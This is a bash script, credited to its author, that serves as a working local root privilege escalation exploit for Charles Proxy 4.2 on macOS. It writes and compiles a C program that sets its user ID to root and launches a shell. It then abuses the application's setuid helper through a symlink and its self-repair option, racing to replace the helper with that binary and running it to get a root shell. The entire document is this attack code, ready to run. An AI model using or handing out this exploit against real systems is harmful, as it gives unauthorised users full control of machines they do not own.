#!/bin/bash
####################################################
###### Charles 4.2 local root privesc exploit ######
###### by m4rkw - https://m4.rkw.io/blog.html ######
####################################################
cd
user="`whoami`"
cat > charles_exploit.c <<EOF
#include <unistd.h>
int main()
{
  setuid(0);
  seteuid(0);
  execl("/bin/bash","bash","-c","rm -f \"/Users/$user/Charles Proxy Settings\"; /bin/bash",NULL);
  return 0;
}
EOF
gcc -o charles_exploit charles_exploit.c
if [ $? -ne 0 ] ; then
  echo "failed to compile the exploit, you need xcode cli tools for this."
  exit 1
fi
rm -f charles_exploit.c
ln -s /Applications/Charles.app/Contents/Resources/Charles\ Proxy\ Settings
./Charles\ Proxy\ Settings --self-repair 2>/dev/null &
rm -f ./Charles\ Proxy\ Settings
mv charles_exploit Charles\ Proxy\ Settings
i=0
while :
do
  r=`ls -la Charles\ Proxy\ Settings |grep root`
  if [ "$r" != "" ] ; then
    break
  fi
  sleep 0.1
  i=$((i+1))
  if [ $i -eq 10 ] ; then
    rm -f Charles\ Proxy\ Settings
    echo "Not vulnerable"
    exit 1
  fi
done
./Charles\ Proxy\ Settings
